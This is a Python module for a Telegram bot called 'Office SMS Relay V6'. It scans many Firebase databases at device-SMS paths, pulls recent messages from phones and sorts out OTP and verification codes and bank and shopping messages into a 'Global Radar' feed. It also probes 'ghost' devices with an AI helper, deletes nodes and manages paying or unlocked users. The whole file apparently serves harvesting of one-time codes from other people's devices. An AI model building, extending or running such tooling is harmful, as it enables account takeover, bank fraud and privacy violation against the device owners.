# ╔══════════════════════════════════════════════════════╗
#   OFFICE SMS RELAY V6 — PHASE 2 HANDLERS
#   Firebase Operations, Global Radar, Admin Controls
# ╚══════════════════════════════════════════════════════╝

import re, asyncio, logging, json
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Tuple

import aiohttp
from aiogram import F, Router
from aiogram.types import CallbackQuery, Message, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext

import config
from groq_ai import ai_learn_firebase_structure, analyze_ghost_device

log = logging.getLogger(__name__)
router = Router()

# ══════════════════════════════════════════════════════
# FIREBASE OPERATIONS (fb_get, fb_ping, fb_delete)
# ══════════════════════════════════════════════════════

async def fb_ping(sess, base_url, api_key=None, timeout=8):
    """Lightweight Firebase connection test"""
    base = base_url.replace(".json", "").rstrip("/")
    url = f"{base}/.json?shallow=true"
    if api_key:
        url += f"&auth={api_key}"
    try:
        async with sess.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            await r.content.read(2048)
            return r.status, None
    except Exception as e:
        return 0, str(e)

async def fb_get(sess, url, timeout=15, api_key=None):
    """GET Firebase endpoint"""
    u = url.split("?")[0]
    q = ("?" + url.split("?")[1]) if "?" in url else ""
    if not u.endswith(".json"):
        u = u.rstrip("/") + ".json"
    if api_key:
        sep = "&" if q else "?"
        q = (q or "?") + sep.replace("?", "") + f"auth={api_key}"
        if not q.startswith("?"):
            q = "?" + q
    try:
        async with sess.get(u + q, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                return await r.json(content_type=None)
            log.warning(f"Firebase HTTP {r.status} → {u}")
            return None
    except Exception as e:
        log.warning(f"Firebase error {u}: {e}")
        return None

async def fb_delete(sess, url, api_key=None, timeout=10):
    """DELETE Firebase node"""
    u = url.rstrip("/")
    if not u.endswith(".json"):
        u += ".json"
    if api_key:
        u += f"?auth={api_key}"
    try:
        async with sess.delete(u, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            return r.status in (200, 204)
    except Exception as e:
        log.warning(f"Firebase delete error {u}: {e}")
        return False

# ══════════════════════════════════════════════════════
# GLOBAL RADAR — Live SMS Activity Across All Firebase
# ══════════════════════════════════════════════════════

_RADAR_CACHE = {
    "events": [],
    "last_update": 0,
}

async def update_global_radar_cache(db):
    """Scan all Firebase sources for recent SMS"""
    global _RADAR_CACHE

    now = asyncio.get_event_loop().time()
    if now - _RADAR_CACHE["last_update"] < config.RADAR_CACHE_TTL:
        return _RADAR_CACHE["events"]

    events = []
    srcs = db.cx().execute("SELECT url, api_key FROM firebase_sources").fetchall()

    async with aiohttp.ClientSession() as sess:
        for src in srcs[:config.MAX_FIREBASE_SOURCES]:
            base = src["url"]
            api_key = src["api_key"]

            # Try common SMS paths
            sms_paths = [
                f"{base}/sms",
                f"{base}/user_sms",
                f"{base}/messages",
                f"{base}/All_Users/sms",
            ]

            for sms_root in sms_paths:
                try:
                    # Get shallow list of devices
                    devs_data = await fb_get(sess, f"{sms_root}.json?shallow=true", api_key=api_key)
                    if not isinstance(devs_data, dict):
                        continue

                    for dev_id in list(devs_data.keys())[:5]:  # Sample 5 devices per path
                        # Get latest SMS
                        sms_data = await fb_get(
                            sess,
                            f"{sms_root}/{dev_id}.json?orderBy=\"$key\"&limitToLast=3",
                            timeout=5,
                            api_key=api_key
                        )
                        if isinstance(sms_data, dict):
                            for entry in sms_data.values():
                                if isinstance(entry, dict):
                                    body = entry.get("body") or entry.get("message") or ""
                                    sender = entry.get("sender") or entry.get("from") or "Unknown"
                                    if body:
                                        # Categorize SMS
                                        category = "SMS"
                                        if any(x in body.upper() for x in ["OTP", "CODE", "VERIFY"]):
                                            category = "OTP"
                                        elif any(x in sender.upper() for x in ["AMAZON", "FLIPKART", "SWIGGY"]):
                                            category = sender.split("-")[0]
                                        elif any(x in sender.upper() for x in ["BANK", "ICICI", "HDFC", "AXIS"]):
                                            category = "Bank"

                                        events.append({
                                            "dev_id": dev_id[:12],
                                            "sender": sender[:20],
                                            "body": body[:80],
                                            "category": category,
                                            "timestamp": datetime.now().isoformat(),
                                        })
                except Exception as e:
                    log.debug(f"Radar scan error {sms_root}: {e}")
                    continue

                if events:
                    break

    _RADAR_CACHE["events"] = events[:50]  # Keep last 50
    _RADAR_CACHE["last_update"] = now
    return _RADAR_CACHE["events"]

@router.callback_query(F.data == "global_radar")
async def cb_global_radar(call: CallbackQuery):
    """Display global SMS activity"""
    from office_relay_v6 import db, check_auth

    if not await check_auth(call.from_user.id, call.message):
        return await call.answer()

    sm = await call.message.answer("⏳ <i>Scanning all Firebase sources...</i>")

    events = await update_global_radar_cache(db)
    if not events:
        return await sm.edit_text("📭 No recent SMS activity.")

    # Categorize by type
    categories = {}
    for evt in events:
        cat = evt["category"]
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(evt)

    text = "╔══════════════════════╗\n  📡 <b>GLOBAL RADAR</b>\n╚══════════════════════╝\n\n"

    filters = [
        ("📱 All", "all"),
        ("🎯 OTP", "OTP"),
        ("🛍 Amazon", "Amazon"),
        ("🛒 Flipkart", "Flipkart"),
        ("🍕 Swiggy", "Swiggy"),
        ("🏦 Banks", "Bank"),
    ]

    for cat_name, cat_key in filters:
        if cat_key == "all":
            count = len(events)
        else:
            count = sum(1 for e in events if e["category"] == cat_key)

        if count > 0:
            text += f"{cat_name}: <b>{count}</b>  "

    text += "\n\n<b>Latest Events:</b>\n"
    for i, evt in enumerate(events[:10], 1):
        text += (
            f"{i}. [{evt['category']}] {evt['sender']}\n"
            f"   💬 {evt['body'][:60]}\n"
        )

    await sm.edit_text(text)
    await call.answer()

# ══════════════════════════════════════════════════════
# FIREBASE HEALTH CENTER
# ══════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_health")
async def cb_firebase_health(call: CallbackQuery):
    """Display Firebase health status"""
    from office_relay_v6 import db, config

    if call.from_user.id not in config.ADMIN_IDS:
        return await call.answer("⛔ Admin only", show_alert=True)

    srcs = db.cx().execute("SELECT * FROM firebase_sources ORDER BY id DESC").fetchall()
    if not srcs:
        return await call.answer("No Firebase sources added.", show_alert=True)

    text = "╔══════════════════════╗\n  📡 <b>FIREBASE HEALTH</b>\n╚══════════════════════╝\n\n"

    btns = []
    for src in srcs:
        health = db.get_firebase_health(src["url"])

        if not health:
            status_icon = "❓"
            status_text = "Unknown"
        else:
            success = health.get("success_count", 0)
            failure = health.get("failure_count", 0)
            total = success + failure
            success_rate = (success / total * 100) if total > 0 else 0

            if health.get("quarantine_reason"):
                status_icon = "🔴"
                status_text = "Quarantined"
            elif success_rate >= 95:
                status_icon = "🟢"
                status_text = "Excellent"
            elif success_rate >= 80:
                status_icon = "🟡"
                status_text = "Slow"
            else:
                status_icon = "🟠"
                status_text = "Warning"

        text += (
            f"{status_icon} <b>{src['label']}</b> [{src['struct_type'] or '?'}]\n"
            f"   Numbers: {src['num_count']}  |  Last sync: {src['last_synced']}\n\n"
        )

        btns.append([InlineKeyboardButton(
            text=f"{status_icon} {src['label']}",
            callback_data=f"health_detail_{src['id']}"
        )])

    await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()

@router.callback_query(F.data.startswith("health_detail_"))
async def cb_health_detail(call: CallbackQuery):
    """Show detailed health stats for one Firebase"""
    from office_relay_v6 import db

    src_id = int(call.data.split("_")[2])
    src = db.cx().execute("SELECT * FROM firebase_sources WHERE id=?", (src_id,)).fetchone()
    if not src:
        return await call.answer("Not found.", show_alert=True)

    health = db.get_firebase_health(src["url"])

    if not health:
        text = f"<b>{src['label']}</b>\n❓ No health data yet."
    else:
        success = health.get("success_count", 0)
        failure = health.get("failure_count", 0)
        timeout = health.get("timeout_count", 0)
        total = success + failure

        if total > 0:
            rate = success / total * 100
        else:
            rate = 0

        text = (
            f"╔══════════════════════╗\n"
            f"  📊 <b>{src['label']} STATS</b>\n"
            f"╚══════════════════════╝\n\n"
            f"✅ Success: <b>{success}</b>\n"
            f"❌ Failure: <b>{failure}</b>\n"
            f"⏱ Timeout: <b>{timeout}</b>\n"
            f"📊 Success Rate: <b>{rate:.1f}%</b>\n"
            f"🕐 Last Check: {health.get('last_check')}\n"
        )

        if health.get("quarantine_reason"):
            text += f"\n⚠️ <b>QUARANTINED</b>\nReason: {health['quarantine_reason']}"

    await call.message.answer(text)
    await call.answer()

# ══════════════════════════════════════════════════════
# FIREBASE QUARANTINE & RECOVERY
# ══════════════════════════════════════════════════════

async def auto_recover_quarantined_firebase(db):
    """Check quarantined Firebase every 30 min, try recovery"""
    if not config.ENABLE_FIREBASE_QUARANTINE:
        return

    while True:
        try:
            quarantined = db.cx().execute(
                "SELECT * FROM firebase_health WHERE quarantine_reason IS NOT NULL"
            ).fetchall()

            async with aiohttp.ClientSession() as sess:
                for item in quarantined:
                    status_code, _ = await fb_ping(sess, item["fb_source"], api_key=None)
                    if status_code == 200:
                        # Recovered!
                        with db.cx() as c:
                            c.execute(
                                """UPDATE firebase_health 
                                   SET quarantine_reason=NULL, consecutive_failures=0, last_recovery_attempt=CURRENT_TIMESTAMP
                                   WHERE fb_source=?""",
                                (item["fb_source"],)
                            )
                        log.info(f"✅ Firebase recovered: {item['fb_source']}")

                        # Alert admin
                        from office_relay_v6 import bot
                        for admin_id in config.ADMIN_IDS:
                            try:
                                await bot.send_message(
                                    admin_id,
                                    f"✅ <b>Firebase Recovered!</b>\n"
                                    f"<code>{item['fb_source']}</code>"
                                )
                            except:
                                pass

        except Exception as e:
            log.error(f"Firebase recovery check failed: {e}")

        await asyncio.sleep(config.FIREBASE_HEALTH_CHECK * 60)

# ══════════════════════════════════════════════════════
# GHOST DEVICE AI ANALYSIS
# ══════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("analyze_ghost_"))
async def cb_analyze_ghost_ai(call: CallbackQuery):
    """Use Groq to analyze ghost device and suggest recovery"""
    from office_relay_v6 import db, check_auth

    if call.from_user.id not in config.ADMIN_IDS:
        return await call.answer("⛔ Admin only", show_alert=True)

    device_id = call.data.split("_")[2]
    num = db.cx().execute("SELECT * FROM numbers WHERE device_id=?", (device_id,)).fetchone()

    if not num:
        return await call.answer("Device not found.", show_alert=True)

    sm = await call.message.answer(f"🤖 <i>Analyzing ghost device {device_id[:12]}...</i>")

    # Fetch raw Firebase data for this device
    async with aiohttp.ClientSession() as sess:
        # Try to fetch from all known paths
        raw_data = {}
        api_key = None  # TODO: get from firebase_sources

        paths_to_try = [
            f"{num['fb_source']}/{device_id}",
            f"{num['fb_source']}/All_Users/DeviceInfo/{device_id}",
            f"{num['fb_source']}/All_Users/simDetails/{device_id}",
        ]

        for path in paths_to_try:
            data = await fb_get(sess, f"{path}.json", api_key=api_key, timeout=5)
            if data:
                raw_data = data
                break

    if not raw_data:
        return await sm.edit_text(
            f"❌ Could not fetch device data.\n"
            f"Try manual probe or check Firebase."
        )

    # Call Groq for analysis
    analysis = await analyze_ghost_device(device_id, raw_data)

    if not analysis:
        return await sm.edit_text("🤖 AI analysis failed. Try again later.")

    text = (
        f"╔══════════════════════╗\n"
        f"  🤖 <b>GHOST ANALYSIS</b>\n"
        f"╚══════════════════════╝\n\n"
        f"📱 Device: <code>{device_id[:16]}</code>\n"
        f"🎯 Confidence: <b>{analysis.get('confidence', 0):.0%}</b>\n\n"
        f"<b>Possible Paths:</b>\n"
    )

    for path in analysis.get("possible_paths", [])[:3]:
        text += f"  • <code>{path}</code>\n"

    text += f"\n<b>Status:</b>\n"
    if analysis.get("likely_active"):
        text += "🟢 Likely Active Device\n"
    if analysis.get("likely_dead"):
        text += "💀 Likely Dead/Inactive\n"

    text += f"\n<b>Recommendation:</b>\n{analysis.get('recommended_action', 'Manual probe needed')}"

    await sm.edit_text(text)
    await call.answer()

# ══════════════════════════════════════════════════════
# SYNC & ADD FIREBASE
# ══════════════════════════════════════════════════════

async def sync_firebase_source(db, url, label=None, api_key=None):
    """Sync one Firebase source and update database"""
    base = url.replace(".json", "").rstrip("/")

    async with aiohttp.ClientSession() as sess:
        # Test connection
        status, err = await fb_ping(sess, base, api_key=api_key)

        if status in (401, 403):
            return 0, "Access Denied - Need API Key", "?"
        elif status == 0:
            return 0, f"Connection Failed: {err or 'Timeout'}", "?"
        elif status != 200:
            return 0, f"HTTP {status} Error", "?"

        # TODO: Call Firebase parser to detect structure and get numbers
        # For now, placeholder
        struct_type = "Unknown"
        num_count = 0

    now = datetime.now().strftime("%d-%m-%Y %H:%M")
    lbl = label or base.split("//")[-1].split(".")[0]

    with db.cx() as c:
        c.execute(
            """INSERT INTO firebase_sources(url,label,added_at,last_synced,num_count,struct_type,api_key)
               VALUES(?,?,?,?,?,?,?)
               ON CONFLICT(url) DO UPDATE SET
                   label=COALESCE(excluded.label,label),
                   last_synced=excluded.last_synced""",
            (base, lbl, now, now, num_count, struct_type, api_key)
        )

    log.info(f"✅ Synced {base} → {num_count} numbers")
    return num_count, None, struct_type

@router.callback_query(F.data == "adm_fb")
async def cb_add_firebase(call: CallbackQuery, state: FSMContext):
    """Add Firebase URL"""
    from office_relay_v6 import config

    if call.from_user.id not in config.ADMIN_IDS:
        return

    await call.message.answer(
        "🔗 <b>Add Firebase URL</b>\n\n"
        "Paste URL (one per line):\n"
        "<code>https://project.firebaseio.com/.json</code>\n\n"
        "Public DB → saved immediately\n"
        "Private DB → I'll ask for API key"
    )
    await state.set_state(S.add_fb)
    await call.answer()

# ══════════════════════════════════════════════════════
# USER MANAGEMENT
# ══════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_users")
async def cb_user_management(call: CallbackQuery):
    """Admin user management panel"""
    from office_relay_v6 import db, config

    if call.from_user.id not in config.ADMIN_IDS:
        return

    total_users = db.cx().execute("SELECT COUNT(*) as c FROM users").fetchone()["c"]
    banned = db.cx().execute("SELECT COUNT(*) as c FROM users WHERE is_banned=1").fetchone()["c"]
    suspended = db.cx().execute("SELECT COUNT(*) as c FROM users WHERE is_suspended=1").fetchone()["c"]
    unlocked = db.cx().execute("SELECT COUNT(*) as c FROM users WHERE is_unlocked=1").fetchone()["c"]

    text = (
        f"╔══════════════════════╗\n"
        f"  👤 <b>USER MANAGEMENT</b>\n"
        f"╚══════════════════════╝\n\n"
        f"📊 Total Users: <b>{total_users}</b>\n"
        f"✅ Unlocked: <b>{unlocked}</b>\n"
        f"🔒 Banned: <b>{banned}</b>\n"
        f"⛔ Suspended: <b>{suspended}</b>\n"
    )

    btns = [
        [InlineKeyboardButton(text="👥 View Users", callback_data="adm_users_list_0")],
        [InlineKeyboardButton(text="⛔ Banned Users", callback_data="adm_banned_list_0")],
        [InlineKeyboardButton(text="🔒 Suspended Users", callback_data="adm_suspended_list_0")],
    ]

    await call.message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
    await call.answer()

# ══════════════════════════════════════════════════════
# AI TEST
# ══════════════════════════════════════════════════════

@router.callback_query(F.data == "adm_ai_test")
async def cb_ai_test(call: CallbackQuery):
    """Test Groq AI connection"""
    from office_relay_v6 import config
    from groq_ai import test_groq_connection

    if call.from_user.id not in config.ADMIN_IDS:
        return

    sm = await call.message.answer("🤖 <i>Testing Groq AI...</i>")

    ok, msg = await test_groq_connection()

    await sm.edit_text(
        f"╔══════════════════════╗\n"
        f"  🤖 <b>GROQ AI TEST</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{'✅ Status: Online' if ok else '❌ Status: Offline'}\n"
        f"Message: {msg}\n\n"
        f"Model: {config.GROQ_MODEL}\n"
        f"API Key: {'✅ Configured' if config.GROQ_API_KEY else '❌ Not Set'}"
    )
    await call.answer()
